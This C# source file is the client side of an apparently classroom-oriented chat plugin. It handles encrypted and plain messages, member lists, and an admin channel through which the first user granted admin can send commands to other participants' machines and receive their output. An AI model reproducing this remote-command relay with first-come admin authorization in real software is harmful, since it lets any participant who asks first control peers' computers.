using System.IO;
using System.Net.Sockets;
using System.Text;
using ClassBox.Plugins.ClassTalk.Crypto;

namespace ClassBox.Plugins.ClassTalk.Net;

/// <summary>
/// 加入（客户端）模式：连接主机，收发 LRNC 加密消息。
/// </summary>
public sealed class ChatClient : IDisposable
{
    private TcpClient? _client;
    private readonly CancellationTokenSource _cts = new();
    private Lrnc1024Session _session = null!;
    private bool _disconnectedRaised;
    private readonly SemaphoreSlim _writeLock = new(1, 1);

    public string Nick { get; private set; } = "";

    public event Action<string, string>? MessageReceived;   // sender, 明文（加密通道解密后）
    public event Action<string, string>? PlainMessageReceived; // sender, 明文（PLAIN 通道）
    public event Action<IReadOnlyList<string>>? MembersUpdated;
    public event Action<string>? SystemMessage;
    public event Action<string>? Disconnected;              // 断线原因
    public event Action<bool, string>? AdminResult;         // 申请管理员的结果（granted, 现有管理员昵称）
    public event Action<string?>? AdminChanged;             // 管理员变化（null = 暂无）
    public event Action<string, string>? CommandReceived;   // 管理员下发命令：adminNick, command
    public event Action<string, string>? CommandOutputReceived; // 目标回传输出：target, output

    public async Task ConnectAsync(string host, int port, string nick, Lrnc1024Session session)
    {
        _session = session;
        Nick = ChatProtocol.SanitizeNick(nick);
        _client = new TcpClient();
        await _client.ConnectAsync(host, port, _cts.Token);
        var stream = _client.GetStream();
        var join = ChatProtocol.FrameControl("JOIN", Nick, Encoding.UTF8.GetBytes(Nick));
        await stream.WriteAsync(join, _cts.Token);
        _ = ReceiveLoopAsync(stream);
    }

    public async Task SendAsync(string message, bool plain = false)
    {
        if (_client == null || !_client.Connected)
            throw new InvalidOperationException("连接已断开，消息没有发出去");
        byte[] frame;
        if (plain)
        {
            frame = ChatProtocol.FramePlainMessage(Nick, message);
        }
        else
        {
            byte[] encrypted = _session.Encrypt(message);
            frame = ChatProtocol.FrameMessage(Nick, encrypted);
        }
        await _writeLock.WaitAsync(_cts.Token);
        try
        {
            var stream = _client.GetStream();
            await stream.WriteAsync(frame, _cts.Token);
            await stream.FlushAsync(_cts.Token);
        }
        finally { _writeLock.Release(); }
        if (plain) PlainMessageReceived?.Invoke(Nick, message); // 本地显示自己的消息
        else MessageReceived?.Invoke(Nick, message);
    }

    /// <summary>申请成为管理员（只有第一个申请的人会被主机批准）。</summary>
    public Task RequestAdminAsync() => SendControlAsync("ADMIN_REQ", Array.Empty<byte>());

    /// <summary>管理员下发命令（经主机鉴权后转发到目标机器）。</summary>
    public Task SendCommandAsync(string targetNick, string command)
        => SendControlAsync("CMD", Encoding.UTF8.GetBytes(targetNick + '\x1f' + command));

    /// <summary>作为被控端，把命令输出回传给主机。</summary>
    public Task SendCommandOutputAsync(string targetNick, string output)
        => SendControlAsync("CMD_OUT", Encoding.UTF8.GetBytes(targetNick + '\x1f' + output));

    private async Task SendControlAsync(string type, byte[] payload)
    {
        if (_client == null || !_client.Connected)
            throw new InvalidOperationException("连接已断开");

        var frame = ChatProtocol.FrameControl(type, Nick, payload);
        await _writeLock.WaitAsync(_cts.Token);
        try
        {
            var stream = _client.GetStream();
            await stream.WriteAsync(frame, _cts.Token);
            await stream.FlushAsync(_cts.Token);
        }
        finally { _writeLock.Release(); }
    }

    public async Task LeaveAsync()
    {
        try
        {
            if (_client != null && _client.Connected)
            {
                var leave = ChatProtocol.FrameControl("LEAVE", Nick, Array.Empty<byte>());
                await _client.GetStream().WriteAsync(leave, _cts.Token);
            }
        }
        catch { }
        finally { Dispose(); }
    }

    private async Task ReceiveLoopAsync(Stream stream)
    {
        try
        {
            while (!_cts.IsCancellationRequested)
            {
                var frame = await ChatProtocol.ReadFrameAsync(stream, _cts.Token);
                if (frame == null) break;
                if (frame.Kind == "MSG")
                {
                    if (frame.Nick == Nick) continue; // 自己已本地显示
                    string plain = _session.DecryptString(frame.Payload);
                    MessageReceived?.Invoke(frame.Nick, plain);
                }
                else if (frame.Kind == "PLAIN")
                {
                    if (frame.Nick == Nick) continue;
                    PlainMessageReceived?.Invoke(frame.Nick, Encoding.UTF8.GetString(frame.Payload));
                }
                else if (frame.Kind == "CTRL")
                {
                    switch (frame.Type)
                    {
                        case "MEMBERS":
                        {
                            string text = Encoding.UTF8.GetString(frame.Payload);
                            var list = text.Split('\x1e', StringSplitOptions.RemoveEmptyEntries);
                            MembersUpdated?.Invoke(list);
                            break;
                        }
                        case "SYS":
                            SystemMessage?.Invoke(Encoding.UTF8.GetString(frame.Payload));
                            break;
                        case "ADMIN_RESULT":
                        {
                            string text = Encoding.UTF8.GetString(frame.Payload);
                            if (text == "OK") AdminResult?.Invoke(true, "");
                            else
                            {
                                string holder = text.StartsWith("DENY|") ? text.Substring(5) : text;
                                AdminResult?.Invoke(false, holder);
                            }
                            break;
                        }
                        case "ADMIN_CHANGED":
                        {
                            string text = Encoding.UTF8.GetString(frame.Payload);
                            AdminChanged?.Invoke(text.Length == 0 ? null : text);
                            break;
                        }
                        case "CMD":
                        {
                            string text = Encoding.UTF8.GetString(frame.Payload);
                            int sep = text.IndexOf('\x1f');
                            if (sep > 0)
                                CommandReceived?.Invoke(frame.Nick, text.Substring(sep + 1));
                            break;
                        }
                        case "CMD_OUT":
                        {
                            string text = Encoding.UTF8.GetString(frame.Payload);
                            int sep = text.IndexOf('\x1f');
                            if (sep > 0)
                                CommandOutputReceived?.Invoke(text.Substring(0, sep), text.Substring(sep + 1));
                            break;
                        }
                        case "LEAVE":
                            return;
                    }
                }
            }
        }
        catch (Exception ex) when (ex is not OperationCanceledException)
        {
            // 断线
        }
        finally
        {
            if (!_disconnectedRaised)
            {
                _disconnectedRaised = true;
                Disconnected?.Invoke("连接已断开");
            }
        }
    }

    public void Dispose()
    {
        _cts.Cancel();
        _client?.Close();
        _client?.Dispose();
        _client = null;
    }
}
